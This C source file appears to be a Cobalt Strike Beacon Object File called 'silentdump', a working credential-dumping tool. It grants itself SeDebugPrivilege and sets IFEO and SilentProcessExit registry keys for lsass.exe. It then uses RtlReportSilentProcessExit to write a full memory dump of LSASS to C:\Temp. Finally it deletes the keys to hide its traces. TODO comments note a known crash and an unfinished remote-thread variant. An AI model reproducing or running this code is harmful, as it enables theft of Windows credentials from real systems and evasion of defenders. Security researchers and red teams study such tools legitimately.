#include "silentdump.h"

// TODO
// - Fix RtlFreeUnicodeString crash
// - Fix CreateRemotheThread method


// From WdToggle Outflank's project
BOOL SetDebugPrivilege()
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = {0};

    NTSTATUS status = ZwOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
    if (status != STATUS_SUCCESS)
    {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    LPCWSTR lpwPriv = L"SeDebugPrivilege";
    if (!ADVAPI32$LookupPrivilegeValueW(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid))
    {
        ZwClose(hToken);
        return FALSE;
    }

    status = ZwAdjustPrivilegesToken(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (status != STATUS_SUCCESS)
    {
        ZwClose(hToken);
        return FALSE;
    }

    ZwClose(hToken);

    return TRUE;
}

INT CreateSilentKey()
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    HANDLE IFEOregKeyHandle = NULL;
    UNICODE_STRING IFEORegistryKeyName;
    HANDLE SPEregKeyHandle = NULL;
    HANDLE SPEregKeyHandleSub = NULL;
    UNICODE_STRING SPERegistryKeyName;
    LPWSTR proc = L"lsass.exe";
    INT Error = 0;

    //Util methods
    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error GetProcAddress RtlInitUnicodeString");
        return 0;
    }

    _RtlAppendUnicodeToString RtlAppendUnicodeToString = (_RtlAppendUnicodeToString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAppendUnicodeToString");
    if (RtlAppendUnicodeToString == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error GetProcAddress RtlAppendUnicodeToString");
        return 0;
    }

    //set up registry key name
    IFEORegistryKeyName.Length = 0;
    IFEORegistryKeyName.MaximumLength = (MSVCRT$wcslen(IFEO_REG_KEY) * sizeof(WCHAR)) + (MSVCRT$wcslen(proc) * sizeof(WCHAR)) + 2;
    IFEORegistryKeyName.Buffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, IFEORegistryKeyName.MaximumLength);

    RtlAppendUnicodeToString(&IFEORegistryKeyName, IFEO_REG_KEY);
    RtlAppendUnicodeToString(&IFEORegistryKeyName, proc);

    // Creating the registry key
    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, &IFEORegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwCreateKey(&IFEOregKeyHandle, KEY_ALL_ACCESS, &ObjectAttributes, 0, NULL, REG_OPTION_VOLATILE, 0);

    if (Status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error registry key %ls : %ld", IFEORegistryKeyName.Buffer, Status);
        goto Cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Registry key has been created : %ls", IFEORegistryKeyName.Buffer);

    // https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table
    DWORD globalFlagData = FLG_MONITOR_SILENT_PROCESS_EXIT;
    UNICODE_STRING GlobalFlagUnicodeStr;
    RtlInitUnicodeString(&GlobalFlagUnicodeStr, L"GlobalFlag");

    Status = ZwSetValueKey(IFEOregKeyHandle, &GlobalFlagUnicodeStr, 0, REG_DWORD, &globalFlagData, sizeof(globalFlagData));

    if (Status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error registry key %ls : %ld", GlobalFlagUnicodeStr.Buffer, Status);
        goto Cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Registry key value has been created : %ls", GlobalFlagUnicodeStr.Buffer);

    //set up registry key name SPE
    SPERegistryKeyName.Length = 0;
    SPERegistryKeyName.MaximumLength = (MSVCRT$wcslen(SILENT_PROCESS_EXIT_REG_KEY) * sizeof(WCHAR)) + (MSVCRT$wcslen(proc) * sizeof(WCHAR)) + 2;
    SPERegistryKeyName.Buffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, SPERegistryKeyName.MaximumLength);

    RtlAppendUnicodeToString(&SPERegistryKeyName, SILENT_PROCESS_EXIT_REG_KEY);

    // Creating the registry key
    OBJECT_ATTRIBUTES ObjectAttributesSPE;
    InitializeObjectAttributes(&ObjectAttributesSPE, &SPERegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwCreateKey(&SPEregKeyHandle, KEY_ALL_ACCESS, &ObjectAttributesSPE, 0, NULL, REG_OPTION_VOLATILE, 0);

    if (Status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error registry key %ls : %ld", SPERegistryKeyName.Buffer, Status);
        goto Cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Registry key has been created : %ls", SPERegistryKeyName.Buffer);

    RtlAppendUnicodeToString(&SPERegistryKeyName, proc);

    // Creating the registry key
    OBJECT_ATTRIBUTES ObjectAttributesSPESub;
    InitializeObjectAttributes(&ObjectAttributesSPESub, &SPERegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwCreateKey(&SPEregKeyHandleSub, KEY_ALL_ACCESS, &ObjectAttributesSPESub, 0, NULL, REG_OPTION_VOLATILE, 0);

    if (Status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error registry key %ls : %ld", SPERegistryKeyName.Buffer, Status);
        goto Cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Registry key has been created : %ls", SPERegistryKeyName.Buffer);

    DWORD ReportingMode = MiniDumpWithFullMemory;
    DWORD DumpType = LOCAL_DUMP;

    //TODO
    wchar_t *LocalDumpFolder = L"C:\\Temp\\";

    // Set SilentProcessExit registry values for the target process

    UNICODE_STRING ReportingModeUnicodeStr;
    RtlInitUnicodeString(&ReportingModeUnicodeStr, L"ReportingMode");
    Status = ZwSetValueKey(SPEregKeyHandleSub, &ReportingModeUnicodeStr, 0, REG_DWORD, &ReportingMode, sizeof(DWORD));
    if (Status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "Error registry key %ls : %ld", ReportingModeUnicodeStr.Buffer, Status);
        goto Cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Sub key ReportingMode has been created");

    UNICODE_STRING LocalDumpFolderUnicodeStr;
    RtlInitUnicodeString(&LocalDumpFolderUnicodeStr, L"LocalDumpFolder");
    Status = ZwSetValueKey(SPEregKeyHandleSub, &LocalDumpFolderUnicodeStr, 0, REG_SZ, LocalDumpFolder, (MSVCRT$wcslen(LocalDumpFolder) * sizeof(WCHAR)) + 2);
    if (Status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error registry key %ls : %ld", LocalDumpFolderUnicodeStr.Buffer, Status);
        goto Cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Sub key LocalDumpFolder has been created");

    UNICODE_STRING DumpTypeUnicodeStr;
    RtlInitUnicodeString(&DumpTypeUnicodeStr, L"DumpType");
    Status = ZwSetValueKey(SPEregKeyHandleSub, &DumpTypeUnicodeStr, 0, REG_DWORD, &DumpType, sizeof(DWORD));
    if (Status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error registry key %ls : %ld", DumpTypeUnicodeStr.Buffer, Status);
        goto Cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Sub key DumpType has been created");

    if (Status != STATUS_SUCCESS)
    {
        goto Cleanup;
    }

    Error = 1;

Cleanup:
    if (IFEOregKeyHandle != NULL)
    {
        ZwClose(IFEOregKeyHandle);
    }

    if (SPEregKeyHandle != NULL)
    {
        ZwClose(SPEregKeyHandle);
    }

    if (SPEregKeyHandleSub != NULL)
    {
        ZwClose(SPEregKeyHandleSub);
    }

    return Error;
}

INT CleanupKey(PUNICODE_STRING rKeyName)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    HANDLE IFEOregKeyHandle = NULL;
    INT Error = 1;

    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, rKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwOpenKey(&IFEOregKeyHandle, KEY_ALL_ACCESS, &ObjectAttributes);
    if (Status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error GetProcAddress RtlInitUnicodeString");

        return 0;
    }

    Status = ZwDeleteKey(IFEOregKeyHandle);

    if (Status != STATUS_SUCCESS)
    {
        Error = 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Status deleted key %ls: %ld", &rKeyName, Status);

    if (IFEOregKeyHandle != NULL)
    {
        ZwClose(IFEOregKeyHandle);
    }

    return Error;
}

INT CleaningAllKeys()
{
    INT CleanResult;

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error GetProcAddress RtlInitUnicodeString");
        return 0;
    }

    _RtlAppendUnicodeToString RtlAppendUnicodeToString = (_RtlAppendUnicodeToString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAppendUnicodeToString");
    if (RtlAppendUnicodeToString == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error GetProcAddress RtlAppendUnicodeToString");
        return 0;
    }

    UNICODE_STRING IFEORegistryKeyName;
    LPWSTR proc = L"lsass.exe";

    IFEORegistryKeyName.Length = 0;
    IFEORegistryKeyName.MaximumLength = (MSVCRT$wcslen(IFEO_REG_KEY) * sizeof(WCHAR)) + (MSVCRT$wcslen(proc) * sizeof(WCHAR)) + 2;
    IFEORegistryKeyName.Buffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, IFEORegistryKeyName.MaximumLength);

    RtlAppendUnicodeToString(&IFEORegistryKeyName, IFEO_REG_KEY);
    RtlAppendUnicodeToString(&IFEORegistryKeyName, proc);

    CleanResult = CleanupKey(&IFEORegistryKeyName);

    UNICODE_STRING SPERegistryKeyName;
    //set up registry key name SPE
    SPERegistryKeyName.Length = 0;
    SPERegistryKeyName.MaximumLength = (MSVCRT$wcslen(SILENT_PROCESS_EXIT_REG_KEY) * sizeof(WCHAR)) + (MSVCRT$wcslen(proc) * sizeof(WCHAR)) + 2;
    SPERegistryKeyName.Buffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, SPERegistryKeyName.MaximumLength);
    RtlAppendUnicodeToString(&SPERegistryKeyName, SILENT_PROCESS_EXIT_REG_KEY);
    RtlAppendUnicodeToString(&SPERegistryKeyName, proc);

    CleanResult = CleanupKey(&SPERegistryKeyName);

    RtlInitUnicodeString(&SPERegistryKeyName, SILENT_PROCESS_EXIT_REG_KEY);

    CleanResult = CleanupKey(&SPERegistryKeyName);

    return 1;
}

void go(char *args, int len)
{
    NTSTATUS Status;
    HANDLE hProcess = NULL;
    DWORD pid;
    datap parser;

    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);
    
    BeaconPrintf(CALLBACK_OUTPUT, "Will dump PID: %ld", pid);

    // Set Debug Privilege
    if (!SetDebugPrivilege())
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set debug privilege.");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Start registry key creation");

    if (CreateSilentKey() == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error on registry keys creation..exiting.");
        return;
    }

    DWORD desiredAccess = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;

    // CreateRemoteThread Method
    //DWORD desiredAccess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;

    _RtlReportSilentProcessExit RtlReportSilentProcessExit = (_RtlReportSilentProcessExit)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlReportSilentProcessExit");
    if (RtlReportSilentProcessExit == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error GetProcAddress RtlReportSilentProcessExit");
        return;
    }

    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    CLIENT_ID uPid = {0};

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
    uPid.UniqueThread = (HANDLE)0;

    Status = ZwOpenProcess(&hProcess, desiredAccess, &ObjectAttributes, &uPid);

    if (hProcess == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Open Process error : %ld", Status);
        goto Cleanup;
    }

    Status = RtlReportSilentProcessExit(hProcess, 0);

    // Fix this method
    /*HANDLE hThread = NULL;
    Status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                              (LPTHREAD_START_ROUTINE)RtlReportSilentProcessExit,  (LPVOID)-1, FALSE, 0, 0, 0, NULL);
    if (hThread == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Open Process error : %ld", Status);
        return;
    }*/

    BeaconPrintf(CALLBACK_OUTPUT, "RtlReportSilentProcessExit dump status : %ld", Status);

Cleanup:
    if (hProcess != NULL)
        ZwClose(hProcess);

    if (CleaningAllKeys() != 0)
        BeaconPrintf(CALLBACK_OUTPUT, "All the registry key have been Cleaned!");
}